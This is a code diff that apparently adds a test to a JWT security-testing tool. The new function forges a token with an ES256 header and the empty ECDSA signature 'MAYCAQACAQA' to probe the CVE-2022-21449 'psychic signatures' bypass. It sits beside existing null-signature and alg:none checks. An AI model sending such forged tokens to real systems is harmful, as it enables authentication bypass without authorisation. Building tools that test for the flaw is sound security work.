@@ -1406,6 +1406,9 @@ def scanModePlaybook():
     # Exploit: null signature
     jwtNull = checkNullSig(contents)
     jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
+    # Exploit: ECDSA empty signature
+    ecdsaEmptySignatureTok = checkECDSAEmptySignature(headDict, paylB64)
+    jwtOut(ecdsaEmptySignatureTok, "Exploit: ECDSA empty signature (CVE-2022-21449)", "This token was sent to check if a empty ECDSA signature can bypass checks")    
     # Exploit: alg:none
     noneToks = checkAlgNone(headDict, paylB64)
     zippedToks = dict(zip(noneToks, ["\"alg\":\"none\"", "\"alg\":\"None\"", "\"alg\":\"NONE\"", "\"alg\":\"nOnE\""]))
@@ -1754,6 +1757,19 @@ def runExploits():
             else:
                 cprintc("No Public Key provided (-pk)\n", "red")
                 parser.print_usage()
+
+
+def checkECDSAEmptySignature(headDict, paylB64):
+    # See
+    # https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
+    # https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21449
+    # https://github.com/ticarpi/jwt_tool/issues/65
+    # Update signature algorithm to an ECDSA one
+    newHead = buildHead("ES256", headDict)
+    # Create and return a token with an empty ECDSA signature
+    CVEToken = newHead + "." + paylB64 + ".MAYCAQACAQA"
+    return CVEToken            
+
 
 def runActions():
     if args.tamper:
